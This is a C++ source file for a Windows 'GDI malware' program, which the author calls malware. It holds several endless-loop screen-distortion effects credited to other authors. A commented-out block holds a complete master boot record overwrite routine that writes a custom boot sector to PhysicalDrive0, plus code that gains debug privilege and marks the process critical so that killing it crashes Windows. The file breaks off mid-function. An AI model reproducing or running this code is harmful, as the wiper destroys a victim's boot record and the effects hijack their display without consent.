// ini1.01.cpp : Este arquivo contém as funções "principais". É aqui que começa e termina a execução do programa.
// 

#include <windows.h>
//#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
//#include <time.h>
#include "booty.h" // Yea I am not funny
//#include "bootrec.h"
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { 
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}/*
const unsigned char MasterBootRecord[] = {0xB4, 0x02, 0xB0, 0x02, 0xB5, 0x00, 0xB1, 0x02, 0xB6, 0x00, 0xBB, 0x00, 0x7E, 0xCD, 0x13, 0xE9, 
0xEE, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 
0xBD, 0x80, 0xFC, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xCD, 0x1A, 0x89, 0x56, 0x08, 0xB8, 0x00, 0xA0, 
0x8E, 0xD8, 0x8E, 0xC0, 0xB0, 0x6B, 0x89, 0xE9, 0x31, 0xFF, 0xF3, 0xAA, 0x30, 0xC0, 0xBF, 0x80, 
0x2D, 0xBA, 0x80, 0x00, 0xB1, 0x40, 0xF3, 0xAA, 0x81, 0xC7, 0x00, 0x01, 0x4A, 0x75, 0xF5, 0x88, 
0x46, 0x0A, 0xBB, 0x72, 0x7F, 0xE8, 0x27, 0x02, 0xE8, 0x3E, 0x02, 0x88, 0x46, 0x02, 0xE8, 0x38, 
0x02, 0x88, 0x46, 0x03, 0xBF, 0x98, 0x2D, 0xBB, 0x08, 0x00, 0x89, 0x5E, 0x04, 0xE8, 0xA9, 0x00, 
0x75, 0xAE, 0x8B, 0x7E, 0x00, 0xB4, 0x01, 0xCD, 0x16, 0x74, 0x08, 0xB4, 0x00, 0xCD, 0x16, 0x88, 
0xE3, 0xEB, 0xF2, 0x88, 0xD8, 0x3C, 0x4B, 0x75, 0x06, 0x83, 0xEF, 0x08, 0xE8, 0x85, 0x00, 0x3C, 
0x4D, 0x75, 0x06, 0x83, 0xC7, 0x08, 0xE8, 0x7B, 0x00, 0x3C, 0x50, 0x74, 0x35, 0x30, 0xC9, 0x3C, 
0x1E, 0x74, 0x06, 0xB1, 0x08, 0x3C, 0x1F, 0x75, 0x1A, 0xE8, 0x7E, 0x00, 0xBB, 0x08, 0xF6, 0x33, 
0x5E, 0x04, 0xF6, 0x41, 0x05, 0xFF, 0x75, 0x08, 0x89, 0x5E, 0x04, 0x30, 0xD9, 0xD3, 0x4E, 0x02, 
0xE8, 0x77, 0x00, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x56, 0x06, 0x72, 0xA6, 0x83, 0xC2, 0x04, 0x89, 
0x56, 0x06, 0x81, 0xC7, 0x00, 0x0A, 0xE8, 0x3B, 0x00, 0x74, 0x97, 0xBB, 0x88, 0x7F, 0xE8, 0x9E, 
0x01, 0xD0, 0x6E, 0x0B, 0x73, 0x1B, 0xE8, 0x23, 0x00, 0xBB, 0xFF, 0x7F, 0xE8, 0x90, 0x01, 0xBB, 
0x0B, 0x80, 0xE8, 0x8A, 0x01, 0xD0, 0x6E, 0x0B, 0x73, 0x05, 0xE8, 0x0F, 0x00, 0xEB, 0xF0, 0xEB, 
0xDA, 0x80, 0x7E, 0x0A, 0x00, 0x0F, 0x87, 0x4F, 0xFF, 0xF4, 0xEB, 0xFD, 0xB9, 0x03, 0x00, 0xB4, 
0x86, 0xCD, 0x15, 0xC3, 0x57, 0xE8, 0x12, 0x00, 0x5F, 0x8A, 0x45, 0x05, 0x0A, 0x41, 0x05, 0x75, 
0x03, 0x89, 0x7E, 0x00, 0x9C, 0xE8, 0x12, 0x00, 0x9D, 0xC3, 0x31, 0xC0, 0xE8, 0x0E, 0x00, 0xC6, 
0x45, 0x07, 0x00, 0x29, 0xDF, 0xC6, 0x45, 0x07, 0x00, 0xC3, 0x8B, 0x46, 0x02, 0x8B, 0x7E, 0x00, 
0x8B, 0x5E, 0x04, 0xBE, 0x92, 0x80, 0xBA, 0xFF, 0xFD, 0x85, 0xDB, 0x78, 0x06, 0xBE, 0x9C, 0x80, 
0xBA, 0xFB, 0xFC, 0xE8, 0x0E, 0x00, 0x88, 0x55, 0x07, 0x88, 0xE0, 0x01, 0xDF, 0xE8, 0x04, 0x00, 
0x88, 0x75, 0x07, 0xC3, 0x60, 0xC6, 0x45, 0x07, 0x00, 0x88, 0xC4, 0xBA, 0x07, 0x00, 0x2E, 0xAC, 
0x88, 0xC3, 0xB9, 0x07, 0x00, 0x30, 0xC0, 0xD0, 0xC3, 0x73, 0x02, 0x88, 0xE0, 0xAA, 0xE2, 0xF5, 
0x81, 0xC7, 0x39, 0x01, 0xD0, 0xE3, 0x4A, 0x72, 0xE9, 0x75, 0xE3, 0x89, 0xE5, 0x89, 0x76, 0x02, 
0x61, 0xC3, 0xE8, 0x04, 0x01, 0x80, 0xFC, 0xDC, 0x72, 0xF7, 0x80, 0x7E, 0x0A, 0x08, 0x74, 0xF1, 
0xFE, 0x46, 0x0A, 0xBE, 0xB2, 0x80, 0xEB, 0xBC, 0xBB, 0x08, 0x00, 0xE8, 0x03, 0x00, 0xBB, 0x00, 
0x0A, 0x57, 0x8A, 0x45, 0x05, 0x84, 0xC0, 0x74, 0x3E, 0xB9, 0x03, 0x00, 0x01, 0xDF, 0x3A, 0x45, 
0x05, 0x75, 0x34, 0xE2, 0xF7, 0xB9, 0x04, 0x00, 0x80, 0xBD, 0xC3, 0x03, 0x00, 0x75, 0x03, 0xFE, 
0x4E, 0x0A, 0x8A, 0x55, 0x07, 0xBE, 0xAD, 0x80, 0xE8, 0x89, 0xFF, 0xE8, 0x1B, 0x00, 0x75, 0x0F, 
0xBE, 0xA7, 0x80, 0x01, 0xD7, 0x50, 0x8A, 0x45, 0x05, 0xE8, 0x78, 0xFF, 0x58, 0x29, 0xD7, 0x29, 
0xDF, 0xE2, 0xDF, 0xC6, 0x46, 0x0B, 0x01, 0x5F, 0xC3, 0x80, 0xFA, 0xFF, 0x75, 0x04, 0xBA, 0x00, 
0xF6, 0xC3, 0x80, 0xFA, 0xFD, 0x75, 0x04, 0xBA, 0x00, 0x0A, 0xC3, 0x80, 0xFA, 0xFC, 0x75, 0x04, 
0xBA, 0xF8, 0xFF, 0xC3, 0x80, 0xFA, 0xFB, 0xBA, 0x08, 0x00, 0x75, 0x02, 0xB2, 0x00, 0xC3, 0xF6, 
0x85, 0x83, 0x02, 0xFF, 0x75, 0xD2, 0x30, 0xC0, 0xE9, 0x39, 0xFF, 0x80, 0xBD, 0xC3, 0x03, 0x00, 
0x74, 0xC6, 0x80, 0xBD, 0x05, 0x0A, 0x00, 0x75, 0xBF, 0x8A, 0x45, 0x07, 0x89, 0xFE, 0x81, 0xC7, 
0x00, 0x0A, 0x3C, 0xFC, 0x74, 0x04, 0x3C, 0xFB, 0x75, 0x18, 0x88, 0xC2, 0xE8, 0xAA, 0xFF, 0x89, 
0xD3, 0x80, 0x79, 0x05, 0x00, 0x75, 0xA1, 0x01, 0xD6, 0x01, 0xD7, 0xE8, 0x08, 0x00, 0x29, 0xD7, 
0x29, 0xD6, 0xC6, 0x46, 0x0B, 0x01, 0xBB, 0x08, 0x00, 0xB9, 0x08, 0x00, 0xA4, 0xC6, 0x44, 0xFF, 
0x00, 0xE2, 0xF9, 0x81, 0xC7, 0x38, 0x01, 0x81, 0xC6, 0x38, 0x01, 0x4B, 0x75, 0xEB, 0xC3, 0xBF, 
0xB8, 0xC3, 0xB9, 0x08, 0x00, 0x60, 0xFF, 0xD3, 0x61, 0x83, 0xEF, 0x08, 0xE2, 0xF7, 0x81, 0xEF, 
0xC0, 0x09, 0x81, 0xFF, 0x80, 0x2D, 0x77, 0xEA, 0xC3, 0x8B, 0x46, 0x08, 0x89, 0xC3, 0x30, 0xFB, 
0xC1, 0xE8, 0x07, 0x88, 0xDC, 0x89, 0x46, 0x08, 0x24, 0x03, 0x74, 0xED, 0xBB, 0xB8, 0x80, 0x2E, 
0xD7, 0xC3, 0xBF, 0xBF, 0xBE, 0xFE, 0x7C, 0x7C, 0xDE, 0xBF, 0xBF, 0xFE, 0x7E, 0xC2, 0xBE, 0xFF, 
0xFE, 0x7E, 0xFC, 0x06, 0xFF, 0xFF, 0xFC, 0x7C, 0xDE, 0xBF, 0xBE, 0xFE, 0x7C, 0x7C, 0x83, 0x83, 
0x82, 0x7C, 0xC6, 0x38, 0x10, 0xAA, 0xFE, 0x92, 0x7C, 0x2C, 0x27, 0x36};
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 1536, &dwBytesWritten, 0);
	return 1;
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
int Random()
{
	HCRYPTPROV hProv;
	if (!hProv)
		CryptAcquireContextA(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);

	int out = 0;
	CryptGenRandom(hProv, sizeof(out), (BYTE*)(&out)); //Generate random number
	return out & 0x7FFFFFFF;
}*/
DWORD WINAPI balls(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader1(LPVOID lpvd)
{
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 3, 0, SRCERASE);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb ^= (x * x + i) ^ (y * y + i) | x * y;
		}
		BitBlt(hdcScreen, 0, 3, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) { //credits to N17Pro3426
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int r = 2, g = 1, b = 4, power = 22;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 3) {
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int v = 1 + rand() % 13;
			((BYTE*)(data + i))[r] = ((BYTE*)(data + i + v + power))[r] + 5.2;
			((BYTE*)(data + i))[g] = ((BYTE*)(data + i + v + power))[g] + 5.2;
			((BYTE*)(data + i))[b] = ((BYTE*)(data + i + v + power))[b] + 5.2;
		}
		SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, NOTSRCERASE);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI train(LPVOID lpParam) // Credits to N17Pro3426 for the train effect
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1)
    {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 30, SRCERASE);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -h + 30, SRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
} 
DWORD WINAPI shader3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL), hmem = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmp = { 0 };
    PRGBQUAD rgbquad = { 0 };
    bmp.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmp.bmiHeader.biBitCount = 32;
    bmp.bmiHeader.biPlanes = 1;
    bmp.bmiHeader.biWidth = sw;
    bmp.bmiHeader.biHeight = sh;
    HBITMAP bmt = CreateDIBSection(hdc, &bmp, NULL, (void**)&rgbquad, NULL, NULL);
    SelectObject(hmem, bmt);
    for (;;) { //e
        BitBlt(hmem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        for (int c = 0; c < sw * sh; c++) {
            int sx = c % sw, sy = c / sw;
            rgbquad[c].b -= sx & sy;
        }
        BitBlt(hdc, 0, 0, sw, sh, hmem, 0, 0, SRCCOPY);
        BitBlt(hdc, rand() % 11, rand() % 11, sw, sh, hdc, rand() % 11, rand() % 11, SRCCOPY);
        Sleep(10);
    }
}
DWORD WINAPI cube(LPVOID lpvd)
{
    int signX = 1;
    int signY = 1;
    int incrementor = 5;
    float x2 = 100.0f;
    float y2 = 100.0f;
    float angleX = 0.0f, angleY = 0.0f, angleZ = 0.0f;
    float angleIncrement = 0.05f;
    float colorA = 0;
    float size = 0.0f;

    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(SM_CXSCREEN);
        int y = GetSystemMetrics(SM_CYSCREEN);
	HBRUSH hbsh = CreateSolidBrush(COLORHSL(colorA));

        x2 += incrementor * signX;
        y2 += incrementor * signY;

        if (x2 + 75 >= x) {
            signX = -1;
            x2 = x - 76;
        }
        else if (x2 <= 75) {
            signX = 1;
            x2 = 76;
        }

        if (y2 + 75 >= y) {
            signY = -1;
            y2 = y - 76;
        }
        else if (y2 <= 75) {
            signY = 1;
            y2 = 76;
        }

        Point3D center = { x2, y2, 0.0f };
	SelectObject(hdc, hbsh);
        Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);

        angleX += angleIncrement;
        angleY += angleIncrement;
        angleZ += angleIncrement;

		Sleep(10);
	DeleteObject(hbsh);
        ReleaseDC(0, hdc);
        colorA += 1;

        if (size >= 0 && size <= 100) {
            size += 0.5;
        }
    }

    return 0;
}
DWORD WINAPI shader4(LPVOID lpvd) //credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 10; x < screenWidth; x++)
		{
			for (int y = 10; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 24) + (i * 24) * sqrt(x * i & i * y ^ x * i * y * i));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 900.f + y / screenHeight * .222f, 122.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader5(LPVOID lpvd) //credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sin(x + y | i & x));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI colorfx(LPVOID lpParam) //by fr4ctalz, but combined with my masher
{
	while (1)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
		int numShifts = 60;
		for (int i = 0; i < numShifts; i++)
		{
			BitBlt(hdcTemp, rand() % 15, rand() % 15, rand() % w, rand() % h, hdcTemp, rand() % 15, rand() % 15, SRCPAINT);
		}
